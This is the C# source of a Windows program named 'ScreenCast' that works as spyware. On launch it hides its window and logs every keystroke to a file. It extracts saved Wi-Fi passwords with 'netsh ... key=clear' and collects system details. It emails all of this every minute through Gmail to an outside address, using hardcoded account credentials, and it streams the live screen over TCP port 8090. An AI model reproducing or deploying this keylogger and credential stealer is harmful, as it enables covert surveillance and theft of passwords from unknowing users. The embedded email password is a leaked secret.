using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Collections.Generic;
using System.Net.Mail;
using System.Text.RegularExpressions;
using NativeWifi;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
namespace ScreenCast
{
    public partial class Main : Form
    {

        private TcpListener listener;
        //IPAddress ipAddress = IPAddress.Parse("0.0.0.0");
        int port = 8090;

        public Main()
        {
            InitializeComponent();
        }
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                using (StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true))
                {
                    if (((Keys)vkCode).ToString() == "OemPeriod")
                    {
                        output.Write(".");
                    }
                    else if (((Keys)vkCode).ToString() == "Oemcomma")
                    {
                        output.Write(",");
                    }
                    else if (((Keys)vkCode).ToString() == "OemMinus")
                    {
                        output.Write("(_-)");
                    }
                    else if (((Keys)vkCode).ToString() == "Oemplus")
                    {
                        output.Write("(+=)");
                    }
                    else if (((Keys)vkCode).ToString() == "Oem5")
                    {
                        output.Write("\\");
                    }
                    else if (((Keys)vkCode).ToString() == "Space")
                    {
                        output.Write(" ");
                    }
                    else
                    {
                        output.Write(((Keys)vkCode).ToString());
                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                String moduleName = currentModule.ModuleName;
                IntPtr moduleHandle = GetModuleHandle(moduleName);
                return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
            }
        }
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern IntPtr UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
        private void Start()
        {
            // Create a TCP listener on the specified port
            listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            // Start accepting clients asynchronously
            Task.Run(() => AcceptClients());
        }

        private void AcceptClients()
        {
            while (true)
            {
                try
                {
                    TcpClient client = listener.AcceptTcpClient();
                    Task.Run(() => SendScreenFrames(client));
                }
                catch
                {
                }
            }
        }


        private void SendScreenFrames(TcpClient client)
        {
            const string Boundary = "MyFrame";// CHNAGE ITO PAG MULTIPLE SCREEN
            using (NetworkStream stream = client.GetStream())
            {
                try
                {
                    string initialBoundary = "" +
                      $"HTTP/1.1 200 OK\r\n" +
                      $"Content-Type: multipart/x-mixed-replace; boundary=--{Boundary}\r\n\r\n";

                    byte[] initialBoundaryBytes = Encoding.ASCII.GetBytes(initialBoundary);
                    stream.Write(initialBoundaryBytes, 0, initialBoundaryBytes.Length);

                    while (client.Connected)
                    {
                        CaptureScreen(stream, Boundary);

                    }
                }
                catch { }
            }
        }

        private void CaptureScreen(NetworkStream stream, string boundary)
        {
            try
            {

                //KINIKUHA MUNA NATIN YUNG PERCENTAGE NG SCREEN SETTING NG WINDOWS PARA TAMA BUO ANG MAKUHA SA SCREEN
                double factor = ScreenPercentage.scale();
                int width = ((int)(Screen.PrimaryScreen.Bounds.Width) * (int)(factor)) / 100;
                int height = ((int)(Screen.PrimaryScreen.Bounds.Height) * (int)(factor) / 100);


                //ILALAGAY NANATIN SA BITMAP YUNG SIZE NG IMAGE
                using (var bmpScreenCapture = new Bitmap(width, height))
                using (var graphics = Graphics.FromImage(bmpScreenCapture))
                {
                    int boundX = Screen.PrimaryScreen.Bounds.X;
                    int boundY = Screen.PrimaryScreen.Bounds.Y;
                    graphics.CopyFromScreen(boundX, boundY, 0, 0, bmpScreenCapture.Size, CopyPixelOperation.SourceCopy);

                    //I SEND NA NATIN SA BROWSER
                    using (var ms = new MemoryStream())
                    {
                        bmpScreenCapture.Save(ms, ImageFormat.Jpeg);
                        string header = $"--{boundary}\r\n" +
                                        $"Content-Type: image/jpeg\r\n" +
                                        $"Content-Length: {ms.Length}\r\n\r\n";

                        byte[] headerBytes = Encoding.ASCII.GetBytes(header);
                        stream.WriteAsync(headerBytes, 0, headerBytes.Length);
                        ms.Position = 0;
                        ms.CopyTo(stream);
                        stream.FlushAsync();
                    }
                }
            }
            catch { }
        }
        static IEnumerable<WlanNetwork> GetAvailableNetworks()
        {
            var networks = new List<WlanNetwork>();

            // Wi-Fi interfeysini aniqlash
            var wlanIface = GetWifiInterface();
            if (wlanIface == null)
            {
                //    Console.WriteLine("Wi-Fi interfeysi topilmadi.");
                return networks;
            }

            // Wi-Fi tarmoqlarini olish
            foreach (var network in wlanIface.GetAvailableNetworkList(Wlan.WlanGetAvailableNetworkFlags.IncludeAllAdhocProfiles))
            {
                networks.Add(new WlanNetwork
                {
                    Ssid = GetStringForSSID(network.dot11Ssid),
                });
            }

            return networks;
        }
        // Wi-Fi interfeysini aniqlash uchun yordamchi funksiya
        static WlanClient.WlanInterface GetWifiInterface()
        {
            var wlanClient = new WlanClient();
            foreach (var wlanInterface in wlanClient.Interfaces)
            {
                if (wlanInterface.InterfaceState == Wlan.WlanInterfaceState.Connected)
                {
                    return wlanInterface;
                }
            }
            return null;
        }

        // SSID ni stringga o'tkazish uchun yordamchi funksiya
        static string GetStringForSSID(Wlan.Dot11Ssid ssid)
        {
            return System.Text.Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
        }
        // Parolni o'qish uchun yordamchi funksiya
        // Wi-Fi tarmoq obyekti
        class WlanNetwork
        {
            public string Ssid { get; set; }
        }
        static string[] GetWifiProfiles()
        {
            Process process = new Process();
            process.StartInfo.FileName = "netsh";
            process.StartInfo.Arguments = "wlan show profiles";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            // Regex orqali barcha profillarni ajratib olish
            Regex regex = new Regex(@"All User Profile\s*:\s*(.*)");
            MatchCollection matches = regex.Matches(output);
            string[] profiles = new string[matches.Count];
            for (int i = 0; i < matches.Count; i++)
            {
                profiles[i] = matches[i].Groups[1].Value.Trim();
            }
            return profiles;
        }
        static string GetWifiPassword(string ssid)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = $"wlan show profile name=\"{ssid}\" key=clear";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // Regex orqali parolni ajratib olish
                Regex regex = new Regex(@"Key Content\s*:\s*(.*)");
                Match match = regex.Match(output);
                if (match.Success)
                {
                    return match.Groups[1].Value.Trim();
                }
                else
                {
                    return "Parol topilmadi yoki mavjud emas";
                }
            }
            catch (Exception ex)
            {
                return $"Xatolik yuz berdi: {ex.Message}";
            }
        }
        public static List<string> GetWiFiIPAddresses()
        {
            List<string> ipAddresses = new List<string>();
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 && ni.OperationalStatus == OperationalStatus.Up)
                {
                    IPInterfaceProperties ipProps = ni.GetIPProperties();
                    foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            ipAddresses.Add(ip.Address.ToString());
                        }
                    }
                }
            }
            return ipAddresses;
        }
        private async void SendEmailReport()
        {
            while (true)
            {
                string path = @"C:\ProgramData\mylog.txt";
                string content = "";

                try
                {
                    using (StreamReader sr = new StreamReader(path))
                    {
                        string line;
                        while ((line = sr.ReadLine()) != null)
                        {
                            content += line;
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Handle exception
                }

                string fromMail = "sabduhoshimov538@gmail.com";
                string fromPassword = "eakbfvoniqfnigku";
                MailMessage message = new MailMessage
                {
                    From = new MailAddress(fromMail),
                    Subject = $"Report from {Environment.UserName}",
                    Body = $"<html><body><h3>5 Minute Report:</h3><hr><br>{content}</body></html>",
                    IsBodyHtml = true
                };
                message.To.Add(new MailAddress("rayimovkhurshid@gmail.com"));

                using (var smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    Credentials = new NetworkCredential(fromMail, fromPassword),
                    EnableSsl = true,
                })
                {
                    smtpClient.Send(message);
                }

                await Task.Delay(TimeSpan.FromMinutes(1)); // Send email report every 5 minutes
            }
        }
        static void DeleteLogFile()
        {
            string path = @"C:\ProgramData\mylog.txt";

            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
            }
            catch (Exception ex)
            {

            }
        }

        static void Asnova()
        {
            string wifilar = "";
            string yaqin_wifi = "";
            var networks = GetAvailableNetworks();

            foreach (var network in networks)
            {

                yaqin_wifi += $"<h5>SSID: {network.Ssid}</h5>";
            }
            try
            {
                var profiles = GetWifiProfiles();
                if (profiles.Length == 0)
                {
                    //      Console.WriteLine("WiFi profillari topilmadi.");
                }
                else
                {
                    //    Console.WriteLine("WiFi profillari:");
                    foreach (var profile in profiles)
                    {
                        string password = GetWifiPassword(profile);
                        //      Console.WriteLine($"SSID: {profile}, Password: {password}");
                        wifilar += $"SSID: {profile}, Password: {password}<br>";
                    }
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Xatolik yuz berdi: {ex.Message}");
            }
            try
            {
                string localIP = "";
                string ethernetip = "";
                List<string> ipAddresses = GetWiFiIPAddresses();
                if (ipAddresses.Count > 0)
                {
                    Console.WriteLine("Wi-Fi IPv4 addresses:");
                    foreach (string ipAddress in ipAddresses)
                    {
                        localIP += $"<br><a href=\"http://{ipAddress}:8090\">Target IP{ipAddress}</a>";
                    }
                }
                else
                {
                    Console.WriteLine("No Wi-Fi adapters with an IPv4 address in the system!");
                }
                List<string> ipAddresses2 = GetEthernetIPAddresses();
                if (ipAddresses2.Count > 0)
                {
                    Console.WriteLine("Ethernet IPv4 addresses:");
                    foreach (string ipAddress in ipAddresses2)
                    {
                        ethernetip += $"<br><a href=\"http://{ipAddress}:8090\">Target IP{ipAddress}</a>";
                    }
                }
                else
                {
                    Console.WriteLine("No Ethernet adapters with an IPv4 address in the system!");
                }

                //Console.WriteLine("Local IP Address: " + localIP);
                string fromMail = "sabduhoshimov538@gmail.com";
                string fromPaswd = "eakbfvoniqfnigku";
                MailMessage message = new MailMessage();
                message.From = new MailAddress(fromMail);
                message.Subject = $"Reports from {Environment.UserName}";
                message.To.Add(new MailAddress("rayimovkhurshid@gmail.com"));
                message.Body = $"<html><body><h3>WLAN adapters IPv4: </h3>{localIP}<hr><br>" +
                    $"<h3>Ethernet adapters IPv4: </h3>{ethernetip}<hr><br>" +
                    $"<h4>OPERATION SYSTEM</h4>" +
                    $"<h5>OS Version: {Environment.OSVersion}</h5>" +
                    $"<h5>OS Platform: {Environment.OSVersion.Platform}</h5>" +
                    $"<h5>OS Version String: {Environment.OSVersion.VersionString}</h5>" +
                    $"<h5>Machine Name: {Environment.MachineName}</h5>" +
                    $"<h5>User Name:  {Environment.UserName}</h5> " +
                    $"<h5>Is 64-bit Operating System: {Environment.Is64BitOperatingSystem}</h5>" +
                    $"<h5>Processor Count: {Environment.ProcessorCount}</h5>" +
                    $"<h5>Full OS Name: {GetOSFullName()}</h5>" +
                    $"<h5>Total RAM: {GetTotalRAM()} MB</h5>" +
                    $"<h5>Memory:</h5> {GetDiskSpaceInfo()}" +
                    $"<h5>System Directory: {Environment.SystemDirectory}</h5>" +
                    $"<h5>Current Directory: {Environment.CurrentDirectory}</h5>" +
                    $"<h4>WIFI PASSWORDS</h4>" +
                    $"{wifilar}<br>" +
                    $"<h4>Near WiFi zones</h4>" +
                    $"{yaqin_wifi}" +
                    $"</body></html>";
                message.IsBodyHtml = true;
                var smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    Credentials = new NetworkCredential(fromMail, fromPaswd),
                    EnableSsl = true,
                };
                smtpClient.Send(message);
                //    Console.WriteLine("Email sent successfully.");
            }
            catch (Exception ex)
            {
                //    Console.WriteLine("Error: " + ex.Message);
            }
        }
        static string GetOSFullName()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
            foreach (ManagementObject os in searcher.Get())
            {
                return os["Caption"].ToString();
            }
            return "Unknown";
        }
        static ulong GetTotalRAM()
        {
            ulong totalRAM = 0;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
            foreach (ManagementObject queryObj in searcher.Get())
            {
                totalRAM = (ulong)queryObj["TotalVisibleMemorySize"] / 1024; // MB ga aylantirish
            }
            return totalRAM;
        }

        static string GetDiskSpaceInfo()
        {
            string diskmanage = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name, FreeSpace, Size FROM Win32_LogicalDisk WHERE DriveType=3");
            foreach (ManagementObject disk in searcher.Get())
            {
                diskmanage += $"<h5>Drive {disk["Name"]}</h5>";
                diskmanage += $"  <h5>Free Space: {(ulong)disk["FreeSpace"] / 1024 / 1024} MB</h5>";
                diskmanage += $"  <h5>Total Size: {(ulong)disk["Size"] / 1024 / 1024} MB</h5>";
            }
            return diskmanage;
        }
        public static List<string> GetEthernetIPAddresses()
        {
            List<string> ipAddresses = new List<string>();
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet && ni.OperationalStatus == OperationalStatus.Up)
                {
                    IPInterfaceProperties ipProps = ni.GetIPProperties();
                    foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            ipAddresses.Add(ip.Address.ToString());
                        }
                    }
                }
            }
            return ipAddresses;
        }
        public static void SendEmail(string fromEmail, string password, string toEmail, string subject, string body)
        {
            // SMTP server sozlamalari
            string smtpHost = "smtp.example.com"; // SMTP serveringiz manzilini kiriting
            int smtpPort = 587; // SMTP portini kiriting (odatda 587 yoki 465 SSL uchun)

            // Elektron pochta xabarini yaratish
            MailMessage mail = new MailMessage();
            mail.From = new MailAddress(fromEmail);
            mail.To.Add(toEmail);
            mail.Subject = subject;
            mail.Body = body;

            // SMTP serveriga ulanish
            SmtpClient smtpClient = new SmtpClient(smtpHost, smtpPort);
            smtpClient.Credentials = new NetworkCredential(fromEmail, password);
            smtpClient.EnableSsl = true; // SSL ulanishni yoqish/yoqmaslikni sozlash (SMTP serveringizga qarab)

            // Elektron pochta xabarini yuborish
            smtpClient.Send(mail);
        }
        private void UpdateHTML()
        {
            //UPDATE HTML PARA SA DYNAMIC IP ADDRESS
            string Ip = Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
            string path = Environment.CurrentDirectory.Replace("\\bin\\Debug", "") + "\\index.html";
            string ImagePath = "http://" + Ip + ":" + port.ToString();
            string image = "<img src=\"" + ImagePath + "\" style=\"\r\n        height: 80%;\r\n        bottom: 0;\r\n        left: 0;\r\n        margin: auto;\r\n        overflow: auto;\r\n        right: 0;\r\n        top: 0px;\r\n        -o-object-fit: contain;\r\n        object-fit: contain;\r\n        border: none;\r\n        border-width: 0px;\r\n        border-color: white;\r\n        -webkit-user-drag: none;\r\n        user-drag: none;\r\n        user-select: none;\r\n        pointer-events: none;\r\n        position:fixed;\"/>";
            File.WriteAllText(path, image);
            try
            {
                Task.Delay(1000);
                Process.Start(path);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        private void Main_Load(object sender, EventArgs e)
        {
            Asnova();
            this.Visible = false;
            this.ShowInTaskbar = true;
            DeleteLogFile();
            hook = SetHook(llkProcedure);
            SendEmailReport();
            Start();
            //UpdateHTML();
        }
        [STAThread]
        static void MainMethod()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Main form = new Main();
            Application.Run(form);
            UnhookWindowsHookEx(hook);
        }
    }
}